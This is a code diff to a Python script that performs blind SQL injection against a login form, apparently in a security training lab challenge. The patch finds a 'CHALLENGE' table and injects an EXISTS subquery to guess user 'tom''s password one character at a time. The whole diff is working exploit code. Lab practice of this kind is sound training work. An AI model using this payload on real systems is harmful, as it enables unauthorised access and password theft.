@@ -15,13 +15,20 @@ def get_password(cookie):
     password_index = 0
     password = ''
     no_of_queries = 0
+    all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))
 
     headers = {
         'Cookie': cookie,
     }
 
+    table_name = ''
+    for i in all_tables:
+        if i.startswith('CHALLENGE'):
+            table_name = i
+            break
+
     while True:
-        query = f'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}'
+        query = f'tom\' AND EXISTS (select * from {table_name} WHERE USERID = \'tom\' AND substring(password,{password_index + 1},1)=\'{alphabet[alphabet_index]}\')--'
         print(query)
         no_of_queries += 1
         data = {
@@ -35,7 +42,6 @@ def get_password(cookie):
 
         try:
             response = json.loads(r.text)
-
         except:
             print("Wrong JSESSIONID, find it by looking at your requests once logged in.")
             return
